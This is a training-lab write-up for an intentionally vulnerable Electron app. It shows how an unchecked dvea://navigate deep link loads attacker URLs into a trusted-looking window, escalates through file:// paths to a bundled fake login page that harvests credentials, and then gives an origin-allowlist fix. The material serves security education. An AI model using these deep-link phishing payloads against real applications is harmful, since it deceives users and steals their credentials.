# Deep Link → Untrusted Navigation — Writeup

Module: Deep Link Hijacking
Lab page: `src/renderer/pages/deep-link-untrusted-navigation.html`
Vulnerable code: `src/main/main.js`

---

## 1. Objective

Craft a deep link that loads attacker-controlled content in the trusted app window.

---

## 2. Exploitation walkthrough

**Step 1 — find the route.** DVEA registers the `dvea://` scheme
(`app.setAsDefaultProtocolClient('dvea')` in `src/main/main.js`) and routes incoming links
through `handleDeepLink(url)`. That function reads a `url` query parameter and, if present,
opens a new app window and loads the target into it via the shared
`openUntrustedNavigationWindow()` helper — no scheme check, no host allowlist, no
confirmation:

```js
function openUntrustedNavigationWindow(target) {
  const win = new BrowserWindow({
    width: 480,
    height: 640,
    show: false,
    resizable: true,
    maximizable: true,
    title: 'DVEA',
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
    },
  });
  // Vulnerable navigation: main process directly loads the attacker URL into a new window
  win.loadURL(target);
  win.once('ready-to-show', () => win.show());
  return win;
}

async function handleDeepLink(url) {
  try {
    const parsed = new URL(url);
    // Route: navigate window to a URL (dvea://navigate?url=...)
    const target = parsed.searchParams.get('url');
    if (target && mainWindow) {
      try {
        openUntrustedNavigationWindow(target);
      } catch (err) {
        console.error('Failed to navigate to deep link target:', err);
      }
      return;
    }
    ...
```

So the real-world attack primitive is a link of the shape:

```
dvea://navigate?url=<attacker-controlled URL>
```

**Step 2 — build the payload.** Any absolute URL works, because `target` is handed to
`win.loadURL()` completely unchecked. The simplest proof-of-concept:

```
dvea://navigate?url=https://attacker.example/phish.html
```

Clicking this link anywhere (email, chat, a webpage) — on a packaged install where the OS
has registered the `dvea://` scheme — makes DVEA pop open a new, native-looking,
`DVEA`-titled window with no address bar, showing `https://attacker.example/phish.html`.
There's no visible signal that the content came from an attacker rather than the app
itself; the app's main window is untouched, so the victim likely doesn't even notice
anything unusual happened besides a new window appearing.

**Step 3 — reproduce locally.** Be precise about what "from source" does and doesn't
provide, because it's easy to conflate two separate things:

- **OS scheme *routing*** — whether typing `dvea://…` in a browser, or running `xdg-open
  dvea://…`, causes the OS to launch/signal DVEA. This depends on a registered handler:
  the `MimeType=x-scheme-handler/dvea` line the maker-deb writes into the installed
  `.desktop` file. Running from source (`npm start`) does **not** reliably give you this,
  so the browser-address-bar / `xdg-open` entry point won't work in development. This is
  what the parent page's "doesn't reliably register the scheme" note refers to.
- **Deep-link *dispatch*** — whether `handleDeepLink()` actually runs once a `dvea://` URL
  reaches the process. This is independent of packaging: `main.js` picks the link out of
  `process.argv` on cold start (`findDeepLinkArg(process.argv)`) and off the second
  instance's argv via the single-instance lock (`app.on('second-instance', …)`). Neither
  reads anything OS-registration-specific.

So a **real** `dvea://` link — the genuine `handleDeepLink()` path, not the simulator — *is*
reproducible from source; you just hand the URL to the process yourself instead of relying
on the OS to route it. Launch the Electron binary against the project with the link as an
argument:

```bash
./node_modules/.bin/electron . 'dvea://navigate?url=https://attacker.example/phish.html'
```

If no DVEA instance is running, this is the cold-start path (`findDeepLinkArg(process.argv)`
fires on first load). If one is already running, the single-instance lock routes this
invocation into the running instance's `second-instance` handler, which calls
`handleDeepLink()` on the running app — again the real code path. Either way you are
exercising `handleDeepLink → openUntrustedNavigationWindow`, not a stand-in.

The lab's "Simulate Deep Link" control is a *convenience* on top of this: it skips both OS
routing and the argv invocation, calling the `simulate-deeplink-window` IPC handler
directly — which still runs the *literally identical* vulnerable code, the exact same
`openUntrustedNavigationWindow()` helper `handleDeepLink` uses:

```js
// src/main/main.js
ipcMain.handle('simulate-deeplink-window', (event, target) => {
  try {
    if (!target) return;
    openUntrustedNavigationWindow(target);
  } catch (err) {
    console.error('simulate-deeplink-window failed:', err);
  }
});
```

Type `https://attacker.example/phish.html` (or any URL you control) into the lab's target
field and click **Simulate Deep Link** — the same new, app-titled window opens and loads
it, proving the objective: attacker-controlled content is now running inside a window the
user believes belongs to DVEA. Because both the real deep-link path and this simulator
route through `openUntrustedNavigationWindow()`, this is not merely a similar reproduction —
it is the same code executing.

**Step 4 — escalate to credential harvesting (bonus).** DVEA bundles a native-looking fake
login page at `src/renderer/pages/fake-login.html`. Because `target` is handed straight to
`loadURL()`, a `file://` URL works just as well as an `http(s)://` one — so pointing the
deep link at that bundled page turns "load attacker content in a trusted window" into a
full credential-harvesting phish. The exact `file://` path depends on how DVEA is
running, because the app's files live in a different place in each case.

*Case A — running from source (`npm start`).* The page sits in the working tree, so the
target is its absolute path in the repo:

```
file:///<path-to-DVEA>/src/renderer/pages/fake-login.html
```

For example, `file:///home/user/dvea/src/renderer/pages/fake-login.html`. Deliver it either
way described in Step 3: as a real link —
`./node_modules/.bin/electron . 'dvea://navigate?url=file:///home/user/dvea/src/renderer/pages/fake-login.html'` —
or, more simply, by pasting the `file://` URL straight into the lab's **Simulate Deep Link**
field. (The browser-address-bar route won't work from source, since the `dvea://` scheme
usually isn't OS-registered in development — that's the routing limitation from Step 3, not
a limit on dispatch.)

*Case B — running from an installed `.deb`.* This is the realistic attack: the OS has
registered `dvea://`, so a genuine `dvea://navigate?url=file://...` link dispatched from a
browser, email, or `xdg-open` reaches the app. The only thing that changes is the path,
because the packaged app no longer lives in your repo — it's installed under the maker-deb
prefix. Critically, **DVEA is not packaged with `asar`** (`forge.config.js`'s
`packagerConfig` sets no `asar` key, and `@electron/packager` defaults it to `false`), so
`resources/app/` is a plain directory of loose files on the real filesystem. No `asar
extract` step is needed — Chromium's `file://` handler reads the page directly:

```
dvea://navigate?url=file:///usr/lib/dvea/resources/app/src/renderer/pages/fake-login.html
```

`/usr/lib/dvea/` is the default install prefix for the `dvea` maker-deb package; if a
repackage or distro places it elsewhere (e.g. `/opt/dvea/`), resolve the real path on the
target with `dpkg -L dvea | grep fake-login`. (If DVEA were ever built *with* asar enabled,
this file would live inside `resources/app.asar` and a plain `file://` URL could **not**
reach it — Chromium's `file://` protocol cannot traverse an asar archive; only Node `fs`
and Electron's own `loadFile`/`protocol` layer can. The navigation route uses `loadURL`,
i.e. the raw `file://` path, so keeping asar off is what makes this specific escalation
work against a packaged build.)

In both cases the outcome is identical: the popup opens showing a "Session Expired — Sign
In" prompt. Submitting that form sends the entered credentials over the
`captured-credentials` IPC channel, which main forwards to the lab page's "Attacker view"
panel; the login page then calls `window.close()` on itself, which only closes that popup —
the lab page (and the rest of the app) is unaffected, exactly as it would be for a real
victim who wouldn't see anything crash or misbehave. This is exactly how a phishing deep
link would harvest real user credentials in the wild, and it works identically whether it
was triggered by a real `dvea://navigate` link (Case B) or the in-app simulator (Case A).

---

## 3. Vulnerable code vs. fixed code

**Vulnerable** (`src/main/main.js`):

```js
function openUntrustedNavigationWindow(target) {
  const win = new BrowserWindow({
    width: 480,
    height: 640,
    show: false,
    resizable: true,
    maximizable: true,
    title: 'DVEA',
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
    },
  });
  // Vulnerable navigation: main process directly loads the attacker URL into a new window
  win.loadURL(target);
  win.once('ready-to-show', () => win.show());
  return win;
}
```

`handleDeepLink`'s `dvea://navigate?url=...` branch and the `simulate-deeplink-window` IPC
handler both call this one function with the attacker-controlled `target` — it's the single
choke point where the untrusted URL actually reaches `loadURL()`.

**Fixed** — allowlist the origin inside that one shared choke point, before ever calling
`loadURL()`:

```diff
+const ALLOWED_NAVIGATE_ORIGINS = new Set([
+  'https://app.dvea.example',   // DVEA's own trusted web origin(s) only
+]);
+
 function openUntrustedNavigationWindow(target) {
+  const targetOrigin = new URL(target).origin;
+  if (!ALLOWED_NAVIGATE_ORIGINS.has(targetOrigin)) {
+    console.warn('Blocked untrusted deep-link navigation target:', target);
+    return null;
+  }
   const win = new BrowserWindow({
     width: 480,
     height: 640,
     show: false,
     resizable: true,
     maximizable: true,
     title: 'DVEA',
     webPreferences: {
       preload: path.join(__dirname, 'preload.js'),
     },
   });
   win.loadURL(target);
   win.once('ready-to-show', () => win.show());
   return win;
 }
```

Because `handleDeepLink` and `simulate-deeplink-window` both call this same function, fixing
it here closes the hole for both at once — no need to duplicate the check at each call
site. (There is a separate, older `simulate-deeplink` IPC handler still in `main.js` that
calls `mainWindow.loadURL(target)` directly rather than going through this helper — it is
not called from any current renderer page, but it would need the identical check applied
directly if it were ever wired back up.)

---

## 4. Why the fix works

- **Compare the origin, not a substring.** `new URL(target).origin` normalizes to
  `scheme://host:port` and is compared against a `Set` with `.has()` — exact match only.
  A naive check like `target.startsWith('https://app.dvea.example')` is bypassable with
  `https://app.dvea.example.attacker.com` (attacker-controlled subdomain of a lookalike
  domain) or `https://app.dvea.example@attacker.com` (userinfo trick on some parsers).
  Comparing the *parsed* origin closes both of those off, because `new URL(...).origin`
  always resolves to the actual host that will be contacted, regardless of what prefix or
  userinfo precedes it in the raw string.
- **Fix the shared choke point, not each caller.** Both the real deep-link handler and the
  simulator call `openUntrustedNavigationWindow()`; putting the check inside that function
  means one edit protects every current and future caller, rather than relying on each new
  call site to remember to validate independently. That's also exactly why this function
  was worth centralizing in the first place — see the note in section 2 about the real
  handler and the simulator running literally the same code.
- **Fail closed.** If `target`'s origin isn't in the allowlist, the function returns `null`
  and never constructs a window or calls `loadURL()` at all — there's no fallback redirect
  to "somewhere safe" that could itself be manipulated.
- **Allowlist, not denylist.** A denylist of "bad" schemes/hosts is always incomplete (new
  schemes, IDN homographs, unusual capitalization); an allowlist of the handful of origins
  DVEA actually needs to navigate to is finite, auditable, and fails safe by default for
  anything not explicitly approved.
- **This is a defense specifically against *this* deep-link handler** — it doesn't replace
  other Electron hardening (`contextIsolation`, disabling `nodeIntegration`, a
  `setWindowOpenHandler`/`will-navigate` guard on the window itself). Those protect the
  renderer once *something* has loaded; this fix stops the untrusted content from being
  loaded into a trusted-looking window in the first place, which is the actual vulnerability
  this lab demonstrates.
